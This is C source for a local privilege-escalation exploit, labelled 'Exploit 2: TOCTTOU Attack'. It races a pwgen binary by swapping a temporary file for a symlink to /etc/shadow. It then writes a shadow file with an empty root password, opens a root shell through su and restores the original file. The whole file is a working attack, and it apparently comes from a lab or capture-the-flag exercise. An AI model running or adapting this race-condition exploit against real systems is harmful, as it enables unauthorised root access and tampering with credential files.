// Exploit 2: TOCTTOU Attack
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define COMMAND_LENGTH 1024
#define SYMLINK "/tmp/pwgen_random"
#define TARGET_FILE "/etc/shadow"
#define MALICIOUS_SHADOW                                                       \
  "\nroot::19958:0:99999:7:::\ndaemon:*:19958:0:99999:7:::\nbin:*:19958:0:"    \
  "99999:7:::\nsys:*:19958:0:99999:7:::\nsync:*:19958:0:99999:7:::\ngames:*:"  \
  "19958:0:99999:7:::\nman:*:19958:0:99999:7:::\nlp:*:19958:0:99999:7:::"      \
  "\nmail:*:19958:0:99999:7:::\nnews:*:19958:0:99999:7:::\nuucp:*:19958:0:"    \
  "99999:7:::\nproxy:*:19958:0:99999:7:::\nwww-data:*:19958:0:99999:7:::"      \
  "\nbackup:*:19958:0:99999:7:::\nlist:*:19958:0:99999:7:::\nirc:*:19958:0:"   \
  "99999:7:::\ngnats:*:19958:0:99999:7:::\nnobody:*:19958:0:99999:7:::"        \
  "\nsystemd-network:*:19958:0:99999:7:::\nsystemd-resolve:*:19958:0:99999:7:" \
  "::\nmessagebus:*:19958:0:99999:7:::\nsystemd-timesync:*:19958:0:99999:7:::" \
  "\nsyslog:*:19958:0:99999:7:::\n_apt:*:19958:0:99999:7:::\ntss:*:19958:0:"   \
  "99999:7:::\nuuidd:*:19958:0:99999:7:::\ntcpdump:*:19958:0:99999:7:::"       \
  "\nsshd:*:19958:0:99999:7:::\npollinate:*:19958:0:99999:7:::\nlandscape:*:"  \
  "19958:0:99999:7:::\nfwupd-refresh:*:19958:0:99999:7:::\nvagrant:*0:19958:"  \
  "0:99999:7:::\nubuntu:!:20111:0:99999:7:::\nlxd:!:20111::::::"
#define SHADOW_COPY                                                            \
  "root:*:19958:0:99999:7:::\ndaemon:*:19958:0:99999:7:::\nbin:*:19958:0:"     \
  "99999:7:::\nsys:*:19958:0:99999:7:::\nsync:*:19958:0:99999:7:::\ngames:*:"  \
  "19958:0:99999:7:::\nman:*:19958:0:99999:7:::\nlp:*:19958:0:99999:7:::"      \
  "\nmail:*:19958:0:99999:7:::\nnews:*:19958:0:99999:7:::\nuucp:*:19958:0:"    \
  "99999:7:::\nproxy:*:19958:0:99999:7:::\nwww-data:*:19958:0:99999:7:::"      \
  "\nbackup:*:19958:0:99999:7:::\nlist:*:19958:0:99999:7:::\nirc:*:19958:0:"   \
  "99999:7:::\ngnats:*:19958:0:99999:7:::\nnobody:*:19958:0:99999:7:::"        \
  "\nsystemd-network:*:19958:0:99999:7:::\nsystemd-resolve:*:19958:0:99999:7:" \
  "::\nmessagebus:*:19958:0:99999:7:::\nsystemd-timesync:*:19958:0:99999:7:::" \
  "\nsyslog:*:19958:0:99999:7:::\n_apt:*:19958:0:99999:7:::\ntss:*:19958:0:"   \
  "99999:7:::\nuuidd:*:19958:0:99999:7:::\ntcpdump:*:19958:0:99999:7:::"       \
  "\nsshd:*:19958:0:99999:7:::\npollinate:*:19958:0:99999:7:::\nlandscape:*:"  \
  "19958:0:99999:7:::\nfwupd-refresh:*:19958:0:99999:7:::\nvagrant:*0:19958:"  \
  "0:99999:7:::\nubuntu:!:20111:0:99999:7:::\nlxd:!:20111::::::"

int main() {
  // Open a pipe to pwgen
  FILE *pwgen_pipe = popen("/usr/local/bin/pwgen -e", "w");
  if (!pwgen_pipe) {
    perror("popen");
    exit(EXIT_FAILURE);
  }

  // Parent process waits briefly to ensure pwgen has passed time-of-check
  sleep(1);

  // Replace /tmp/pwgen_random with a symlink to /etc/shadow
  unlink(SYMLINK); // Remove any existing file or link
  if (symlink(TARGET_FILE, SYMLINK) != 0) {
    perror("symlink");
    exit(EXIT_FAILURE);
  }

  // Provide malicious input to overwrite /etc/shadow to login as root
  fprintf(pwgen_pipe, "%s", MALICIOUS_SHADOW);
  pclose(pwgen_pipe);

  // Open root shell
  system("su root -c '/bin/sh'");

  // Restore /etc/passwd to prevent crushing the system
  char recovery[COMMAND_LENGTH];
  snprintf(recovery, COMMAND_LENGTH, "su root -c \'echo \"%s\" > %s\'",
           SHADOW_COPY, TARGET_FILE);
  system(recovery);
  return 0;
}
